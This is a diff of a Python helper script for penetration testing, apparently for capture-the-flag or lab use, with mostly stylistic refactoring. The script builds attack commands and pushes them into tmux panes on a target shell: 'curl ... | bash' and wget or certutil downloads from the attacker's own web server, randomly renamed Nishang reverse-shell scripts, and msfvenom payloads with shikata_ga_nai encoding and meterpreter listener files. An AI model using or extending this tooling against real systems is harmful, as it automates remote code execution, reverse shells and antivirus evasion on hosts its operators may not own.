@@ -15,9 +15,9 @@ def get_ip(iface):
 def interfaces():
     cmd = 'ip l | grep -E \'^[[:digit:]]+: \' | cut -d \':\' -f 2'
     lines = os.popen(cmd).readlines()
-    interfaces = list(map(lambda x: x.strip('\n '), lines))
-    if 'tun0' in interfaces and not 'tun1' in interfaces:
-        return 'tun0'
+    interfaces = [x.strip('\n ') for x in lines]
+    tunInterfaces = [x for x in interfaces if str(x).startswith('tun')]
+    if len(tunInterfaces) == 1: return tunInterfaces[0]
     print("Select interface.")
     menu = TerminalMenu(interfaces)
     index = menu.show()
@@ -27,23 +27,24 @@ def get_interface_ip():
     return get_ip(interfaces())
 
 def strip_lines(lines):
-    return list(map(lambda x: x.strip('\n '), lines))
+    # return list(map(lambda x: x.strip('\n '), lines))
+    return [l.strip('\n ') for l in lines]
+
+def random_name(count):
+    return ''.join(random.choice(string.ascii_lowercase) for i in range(count))
 
 def copy_to_tmux(text):
-    print(text)
-    cmd2 = f"echo -n {text} | tmux loadb -"
-    os.system(cmd2)
+    os.system(f"echo -n {text} | tmux loadb -")
 
 def select_pane():
-    cmd = "tmux list-panes | grep -v active"
-    panes = list(map(lambda x: x.strip('\n '), os.popen(cmd).readlines()))
-    if len(panes) == 1:
-        return panes[0].split(' ')[-1]
+    panes = strip_lines(os.popen("tmux list-panes | grep -v active").readlines())
+    def paneIndex(p): 
+        return panes[p].split(' ')[-1]
+    if len(panes) == 1: return paneIndex(0)
     else:
         print("Select pane.")
-        menu = TerminalMenu(panes)
-        index = menu.show()
-        return panes[index].split(' ')[-1]
+        index = TerminalMenu(panes).show()
+        return paneIndex(index)
 
 def copy_to_pane(text):
     pane = select_pane()
@@ -51,12 +52,9 @@ def copy_to_pane(text):
     
 def copy_to_menu(text):
     options = ["To tmux buffer", "To tmux pane..."]
-    terminal_menu = TerminalMenu(options)
-    index = terminal_menu.show()
-    if index == 0:
-        copy_to_tmux(text)
-    elif index == 1:
-        copy_to_pane(text)
+    index = TerminalMenu(options).show()
+    if index == 0: copy_to_tmux(text)
+    elif index == 1: copy_to_pane(text)
 
 def stabilize_shell():
     options = ['python3', 'python']
@@ -70,10 +68,8 @@ def stabilize_shell():
 
 def get_apache_file(pattern):
     print("Choose file...")
-    if pattern == '':
-        cmd = "ls /var/www/html"
-    else:
-        cmd = f"ls /var/www/html | grep '{pattern}$'"
+    if pattern == '': cmd = "ls /var/www/html"
+    else: cmd = f"ls /var/www/html | grep '{pattern}$'"
     files = strip_lines(os.popen(cmd).readlines())
     index = TerminalMenu(files).show()
     print(files[index])
@@ -82,11 +78,13 @@ def get_apache_file(pattern):
 def get_temp_python_file(pattern):
     ip = get_interface_ip()
     pid, port = select_python_http()
-    if pattern == '':
-        cmd = f"ls /proc/{pid}/cwd"
-    else:
-        cmd = f"ls /proc/{pid}/cwd | grep '{pattern}$'"
+    if pattern == '': cmd = f"ls /proc/{pid}/cwd"
+    else: cmd = f"ls /proc/{pid}/cwd | grep '{pattern}$'"
     files = strip_lines(os.popen(cmd).readlines())
+    if len(files) == 0:
+        if len(pattern) > 0: print(f"No {pattern} files in python http dir /proc/{pid}/cwd")
+        else: print(f"No files in python http dir /proc/{pid}/cwd")
+        raise Exception("No files in python http directory" + input())
     index = TerminalMenu(files).show()
     filename = files[index]
     if int(port) != 80: url = f"http://{ip}:{port}/{filename}"
@@ -94,22 +92,19 @@ def get_temp_python_file(pattern):
     return url, filename
 
 def select_python_http():
-    cmd = "ps -ef | grep http.server | grep -v grep"
-    lines = os.popen(cmd).readlines()
+    lines = os.popen("ps -ef | grep http.server | grep -v grep").readlines()
     pids = []
     ports = []
     options = []
     for l in lines:
-        items = list(map(lambda x: x.strip('\n'), filter(lambda x: len(x) > 0, l.split(' '))))
+        items = [x.strip('\n') for x in l.split(' ') if len(x) > 0]
         port = items[-1]
         pid = items[1]
         pids.append(pid)
         ports.append(port)
         options.append(f"PID {pid} Port {port}")
-    if len(options) == 1:
-        return pids[0], ports[0]
-    elif len(options) == 0:
-        raise Exception('No Python HTTP servers')
+    if len(options) == 1: return pids[0], ports[0]
+    elif len(options) == 0: raise Exception('No Python HTTP servers')
     else:
         print("Select Python HTTP Server")
         index = TerminalMenu(options).show()
@@ -117,7 +112,7 @@ def select_python_http():
 
 def copy_nishang(ip, port, directory):
     lines = open(NISHANG_SCRIPT, 'r').readlines()
-    randomName = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
+    randomName = random_name(8)
     functionName = 'Invoke-' + randomName
     filename = f"{randomName}.ps1"
     output = ''
@@ -145,33 +140,28 @@ def is_python_http_running():
 
 def linux_menu():
     options = ["Stabilize shell", "wget a file", "curl file and pipe to bash"]
-    terminal_menu = TerminalMenu(options)
-    index = terminal_menu.show()
+    index = TerminalMenu(options).show()
     print(options[index])
-    if index == 0:
-        stabilize_shell()
+    def getUrl(fileExtension):
+        if not is_python_http_running() or choose_apache_or_python(): # then use apache
+            file = get_apache_file(fileExtension)
+        else:
+            file = get_temp_python_file(fileExtension)
+        return f"{ip}/{file}"
+    if index == 0: stabilize_shell()
     elif index == 1 or index == 2:
-        useApache = True
-        if is_python_http_running(): useApache = choose_apache_or_python()
-
         ip = get_interface_ip()
         if index == 1: # wget a file
-            if useApache: 
-                file = get_apache_file('')
-                url = f"{ip}/{file}"
-            else: url, _ = get_temp_python_file('')
+            url = getUrl('')
             cmd = f"wget {url}"
         elif index == 2: # curl file and pipe to bash
-            if useApache:
-                file = get_apache_file('.sh')
-                url = f"{ip}/{file}"
-            else: url, _ = get_temp_python_file('.sh')
+            url = getUrl('.sh')
             cmd = f"curl {url} | bash"
         copy_to_pane(cmd)
 
 def choose_apache_or_python():
     print("Get file from apache or temp python server?")
-    index = TerminalMenu(["Apache", "Python HTTP"]).show()
+    index = TerminalMenu(["Apache, port 80", "Python HTTP"]).show()
     return index == 0
 
 def nishang_shell_menu():
@@ -239,7 +229,7 @@ def msfvenom_generate_menu(ip, directory):
     format = options[index]
     print(format)
 
-    randomName = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
+    randomName = random_name(8)
 
     # if meterpreter, generate RC file as well to launch msfconsole with the right kind of multi/handler listener
     if shellType == 'meterpreter':
@@ -257,6 +247,7 @@ run
     
     # select encoders or none, different ones for x86 and x64
     # if encoders are used, enter iterations
+    #TODO: add more encoders
     options = ['None']
     if arch == 'x86':
         options.append('x86/shikata_ga_nai')
@@ -274,8 +265,7 @@ run
     
     filename = f"{directory}{randomName}.{format}"
     cmd = f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {format} -o {filename}"
-    if len(encoder) > 0:
-        cmd += f" -e {encoder} -i {iterations}"
+    if len(encoder) > 0: cmd += f" -e {encoder} -i {iterations}"
 
     print(cmd)
     os.system(cmd)
@@ -295,8 +285,6 @@ def windows_menu():
     print(options[index])
     if index in [0,1,2]:        
         def getUrl(fileSelector):
-            # useApache = True
-            # if is_python_http_running(): useApache = choose_apache_or_python()
             if not is_python_http_running() or choose_apache_or_python(): # use apache
                 file = get_apache_file(fileSelector)
                 url = f"http://{ip}/{file}"
@@ -317,15 +305,13 @@ def windows_menu():
             url, file = getUrl('')
             cmd = f"tmux send-keys -t {pane} 'certutil.exe -urlcache -split -f \"{url}\" {file}'"
         os.system(cmd)
-
     elif index == 3:
         nishang_shell_menu()
 
 def main():
     os.system("pwd")
     options = ["Copy my IP", "Linux shell commands", "Windows shell commands", "Copy python HTTP", "MSFVenom", "Start apache", "Stop apache"]
-    terminal_menu = TerminalMenu(options)
-    index = terminal_menu.show()
+    index = TerminalMenu(options).show()
     print(options[index])
     if index == 0:
         copy_to_menu(get_interface_ip())
